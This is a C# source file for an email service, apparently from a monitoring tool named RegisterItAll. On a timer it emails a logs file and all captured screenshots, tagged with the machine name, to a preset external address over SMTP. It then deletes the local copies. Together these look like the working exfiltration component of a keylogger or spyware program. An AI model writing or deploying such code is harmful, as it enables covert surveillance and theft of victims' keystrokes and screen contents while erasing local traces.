using RegisterItAll.Managers;
using RegisterItAll.Services.Base;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace RegisterItAll.Services
{
    public partial class EmailSenderService : IterativeBehaviourService
    {
        private static string SenderEmailAddress = ConfigurationManager.AppSettings.Get("SenderEmailAddress");
        private static string SenderEmailHost = ConfigurationManager.AppSettings.Get("SenderEmailHost");
        private static string SenderEmailPassword = ConfigurationManager.AppSettings.Get("SenderEmailPassword");
        private static string ReceiverEmailAddress = ConfigurationManager.AppSettings.Get("ReceiverEmailAddress");

        protected override int ExecutionIntervalInSeconds => Convert.ToInt32(ConfigurationManager.AppSettings.Get("EmailFrequencyInSeconds"));

        protected override void ExecuteIterationImplementation()
        {
            MailMessage message = new MailMessage()
            {
                From = new MailAddress(SenderEmailAddress, displayName: null, Encoding.UTF8),
                Subject = $"RegisterItAll ({Environment.MachineName})",
                SubjectEncoding = Encoding.UTF8,
            };

            message.To.Add(ReceiverEmailAddress);

            string logsFile = FilesManager.GetLogsFile();
            message.Attachments.Add(new Attachment(logsFile));

            IEnumerable<string> screenshots = FilesManager.GetScreenshots();
            foreach (string screenshot in screenshots)
            {
                message.Attachments.Add(new Attachment(screenshot));
            }

            SmtpClient client = new SmtpClient()
            {
                Credentials = new NetworkCredential(SenderEmailAddress, SenderEmailPassword),
                Host = SenderEmailHost,
                Port = 587,
                EnableSsl = true,
            };

            client.Send(message);

            int attachmentsNumber = message.Attachments.Count();

            message.Dispose();
            client.Dispose();

            FilesManager.RemoveLogsFile(logsFile);
            FilesManager.RemoveScreenshots(screenshots);

            Console.WriteLine($"Email sended with {attachmentsNumber} attachment/s.");
        }
    }
}